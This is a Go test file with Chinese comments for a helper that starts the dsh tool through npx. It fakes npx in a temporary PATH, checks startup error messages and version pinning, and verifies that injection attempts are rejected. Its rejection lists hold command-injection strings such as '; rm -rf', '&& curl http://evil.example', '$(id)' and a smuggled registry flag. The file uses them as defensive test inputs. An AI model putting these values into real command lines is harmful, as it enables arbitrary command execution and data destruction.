package dshproc

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// writeExec 写一个可执行的 shell 脚本到目录里，用于伪造 PATH 上的命令。
func writeExec(t *testing.T, dir, name, script string) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skipf("用 shell 脚本伪造命令，仅类 Unix 平台")
	}
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"+script), 0o755); err != nil {
		t.Fatalf("写入 %s 失败: %v", path, err)
	}
}

// fakeNpx 生成一个可编程的假 npx 脚本：按调用形态返回不同输出。
// 冒烟调用是 `npx --yes @deepseek-ai/dsh web --help`（$3=web $4=--help）。
func fakeNpx(webHelpOutput string) string {
	return "if [ \"$3\" = web ] && [ \"$4\" = \"--help\" ]; then\n" + webHelpOutput + "\nfi\nexit 0\n"
}

// TestEnsureDSHWithoutNpx 锁定「没有 npx」时的指引：dsh 官方启动方式依赖
// npx，这是必须说清楚的第一道门槛。
func TestEnsureDSHWithoutNpx(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("用 shell 脚本伪造命令，仅类 Unix 平台")
	}
	t.Setenv("PATH", t.TempDir())

	_, err := EnsureDSH(context.Background(), nil, "")
	if err == nil {
		t.Fatal("没有 npx 时应当返回错误")
	}
	if !strings.Contains(err.Error(), "npx") || !strings.Contains(err.Error(), "Node.js") {
		t.Fatalf("错误应指路 npx 与 Node.js，实际: %v", err)
	}
}

// TestEnsureDSHSmokePass 冒烟通过时返回官方命令形态。
func TestEnsureDSHSmokePass(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("用 shell 脚本伪造命令，仅类 Unix 平台")
	}
	bin := t.TempDir()
	writeExec(t, bin, "npx", fakeNpx("echo --host; echo --port; echo --no-open"))
	t.Setenv("PATH", bin)

	resolved, err := EnsureDSH(context.Background(), nil, "")
	if err != nil {
		t.Fatalf("EnsureDSH 失败: %v", err)
	}
	if !strings.Contains(resolved.Command, "--yes") || !strings.Contains(resolved.Command, dshPackage) {
		t.Fatalf("EnsureDSH = %q，期望 npx --yes 官方形态", resolved.Command)
	}
	if resolved.Registry != "" {
		t.Errorf("官方源就用默认源，不该换成 %q", resolved.Registry)
	}
}

// TestEnsureDSHSilentExitGuidance 入口静默不执行（exit 0 无输出）时的指引
// 必须带证据：说清是 bin.js 的 import.meta.main 守门与 Node 版本的关系。
func TestEnsureDSHSilentExitGuidance(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("用 shell 脚本伪造命令，仅类 Unix 平台")
	}
	bin := t.TempDir()
	writeExec(t, bin, "npx", fakeNpx(":")) // 静默退出
	t.Setenv("PATH", bin)

	_, err := EnsureDSH(context.Background(), nil, "")
	if err == nil {
		t.Fatal("入口静默退出时应当返回错误")
	}
	if !strings.Contains(err.Error(), "import.meta.main") || !strings.Contains(err.Error(), "静默退出") {
		t.Fatalf("错误应包含证据（import.meta.main 守门）与现象，实际: %v", err)
	}
}

// TestEnsureDSHCrashBannerGuidance 旧 Node 崩溃时指引要引用横幅里的版本。
func TestEnsureDSHCrashBannerGuidance(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("用 shell 脚本伪造命令，仅类 Unix 平台")
	}
	bin := t.TempDir()
	writeExec(t, bin, "npx", fakeNpx("echo SyntaxError: parseEnv >&2; echo Node.js v18.20.4 >&2; exit 1"))
	t.Setenv("PATH", bin)

	_, err := EnsureDSH(context.Background(), nil, "")
	if err == nil {
		t.Fatal("崩溃时应当返回错误")
	}
	if !strings.Contains(err.Error(), "Node.js v18.20") || !strings.Contains(err.Error(), "parseEnv") {
		t.Fatalf("错误应引用崩溃证据（版本横幅与报错），实际: %v", err)
	}
}

// TestEnsureDSHBindingGuidance 缺平台原生绑定时指引要引用原始报错，
// 并说明这是上游分发问题、网关修不了。
func TestEnsureDSHBindingGuidance(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("用 shell 脚本伪造命令，仅类 Unix 平台")
	}
	bin := t.TempDir()
	writeExec(t, bin, "npx", fakeNpx("echo 'dsh: fatal uncaught exception: Error: dsh: host preparation failed: "+
		"No usable native binding found for node-addon-require-builtin-linux-x64-gnu (auto)' >&2; exit 1"))
	t.Setenv("PATH", bin)

	_, err := EnsureDSH(context.Background(), nil, "")
	if err == nil {
		t.Fatal("缺绑定时应当返回错误")
	}
	if !strings.Contains(err.Error(), "原生绑定") ||
		!strings.Contains(err.Error(), "linux-x64-gnu") ||
		!strings.Contains(err.Error(), "dsh 上游") {
		t.Fatalf("错误应引用绑定缺失证据并指向上游，实际: %v", err)
	}
}

// TestValidateDshVersion 钉版本要拼进启动命令，而那条命令之后会被拆开直接执行，
// 所以版本名只收 npm 版本号与 dist-tag 用得到的字符：多一个空格就多一个参数，
// 多一个分号就多一条命令。
func TestValidateDshVersion(t *testing.T) {
	accepted := []string{
		"", "next", "alpha", "latest", "0.2.2-alpha.2", "0.2.1-rc.4", "1.0.0",
		"1.0.0-beta.1+build.7", "^1.2.3", "~1.2.3", "*", "0.2.2-rc.2+20260101",
	}
	for _, raw := range accepted {
		got, err := ValidateDshVersion(raw)
		if err != nil {
			t.Errorf("ValidateDshVersion(%q) 出错: %v", raw, err)
		}
		if want := strings.TrimSpace(raw); got != want {
			t.Errorf("ValidateDshVersion(%q) = %q，期望 %q", raw, got, want)
		}
	}

	rejected := []string{
		"1.0.0 --registry=http://evil.example",
		"1.0.0; rm -rf /tmp/dsh",
		"1.0.0 && curl http://evil.example",
		"$(id)", "`id`", "--yes",
		"0.2.2 alpha", "1.0.0\nweb", "v1.0=\"x\"", ">=1.0 <2", "@scope/pkg@1",
	}
	for _, raw := range rejected {
		if got, err := ValidateDshVersion(raw); err == nil {
			t.Errorf("ValidateDshVersion(%q) 应当拒绝，返回了 %q", raw, got)
		}
	}
}

// TestVersionPlanPinnedNeverFallsBack 钉住时候选只有那一个版本。
//
// 自动回退的前提是「用户没说要哪个版本，能跑就行」；点了名还悄悄换成另一个版本，
// 用户就拿着一个自己没选过的在跑——比装不上更难查。
func TestVersionPlanPinnedNeverFallsBack(t *testing.T) {
	got := versionPlan("next")
	if len(got) != 1 || got[0] != "next" {
		t.Fatalf("versionPlan(next) = %v，期望只有 next 一个候选", got)
	}
	follow := versionPlan("")
	if len(follow) != 1+len(fallbackVersions) || follow[0] != "" {
		t.Fatalf("versionPlan(\"\") = %v，期望 latest 打头再跟上 %d 个回退版本", follow, len(fallbackVersions))
	}
}

// TestPackageSpecCarriesVersion pnpm 用的是「包名@版本」这一个参数。
func TestPackageSpecCarriesVersion(t *testing.T) {
	if got := packageSpec("next"); got != dshPackage+"@next" {
		t.Errorf("packageSpec(next) = %q，期望 %q", got, dshPackage+"@next")
	}
	if got := packageSpec(""); got != dshPackage {
		t.Errorf("packageSpec(\"\") = %q，留空应当是裸包名（npm 自己按 latest 解）", got)
	}
	if got := packageSpec("   "); got != dshPackage {
		t.Errorf("packageSpec(空白) = %q，空白等同于留空", got)
	}
}

// TestNpxCommandCarriesVersion 版本写在包名同一个参数里，不能变成多一个参数。
func TestNpxCommandCarriesVersion(t *testing.T) {
	got := npxCommand("npx", "0.2.2-alpha.2", "")
	want := "npx --yes " + dshPackage + "@0.2.2-alpha.2"
	if got != want {
		t.Errorf("npxCommand = %q，期望 %q", got, want)
	}
	if parts, err := SplitCommand(got); err != nil || len(parts) != 3 {
		t.Errorf("钉版本的命令应当只有 3 个参数，实际 %v（err=%v）", parts, err)
	}
	if plain := npxCommand("npx", "", ""); plain != "npx --yes "+dshPackage {
		t.Errorf("留空时不该带 @： %q", plain)
	}
}

// TestEnsureDSHVersionPinnedFailsWithoutFallback 钉住的版本装不上时只试一次，
// 报错要指着那一个版本说。
func TestEnsureDSHVersionPinnedFailsWithoutFallback(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("用 shell 脚本伪造命令，仅类 Unix 平台")
	}
	bin := t.TempDir()
	calls := filepath.Join(bin, "calls.log")
	writeExec(t, bin, "npx", "echo \"$2\" >> "+calls+"\n"+
		"echo 'dsh: fatal uncaught exception' >&2; echo 'Node.js v18.20.4' >&2; exit 1\n")
	t.Setenv("PATH", bin)

	_, err := EnsureDSHVersion(context.Background(), nil, "", "", "next")
	if err == nil {
		t.Fatal("钉住的版本冒烟不通过时应当报错")
	}
	text := err.Error()
	if !strings.Contains(text, "指定的 dsh 版本 next") {
		t.Errorf("错误应指着钉住的版本说，实际: %s", text)
	}
	if !strings.Contains(text, "dist-tags") {
		t.Errorf("错误应指路 npm view 查可用的版本名，实际: %s", text)
	}
	data, readErr := os.ReadFile(calls)
	if readErr != nil {
		t.Fatalf("读取调用记录失败: %v", readErr)
	}
	lines := strings.Count(strings.TrimSpace(string(data)), "\n") + 1
	if lines != 1 {
		t.Errorf("钉住时只该调用一次 npx（不许退回旧版本），实际 %d 次:\n%s", lines, data)
	}
	if !strings.Contains(string(data), dshPackage+"@next") {
		t.Errorf("传给 npx 的包名应带上下钉住的版本，实际:\n%s", data)
	}
}

// TestEnsureDSHVersionRejectsInjection 非法版本名在动手之前就挡掉：这条路径上
// 版本名会变成命令行参数，不该被送进任何子进程。
func TestEnsureDSHVersionRejectsInjection(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("用 shell 脚本伪造命令，仅类 Unix 平台")
	}
	bin := t.TempDir()
	calls := filepath.Join(bin, "calls.log")
	writeExec(t, bin, "npx", "echo \"$2\" >> "+calls+"\nexit 0\n")
	t.Setenv("PATH", bin)

	_, err := EnsureDSHVersion(context.Background(), nil, "", "", "1.0.0 --registry=http://evil.example")
	if err == nil || !strings.Contains(err.Error(), "不合法") {
		t.Fatalf("非法版本名应在调用 npx 之前就被拒绝，实际: %v", err)
	}
	if _, statErr := os.Stat(calls); statErr == nil {
		t.Fatal("非法版本名不该走到 npx")
	}
}
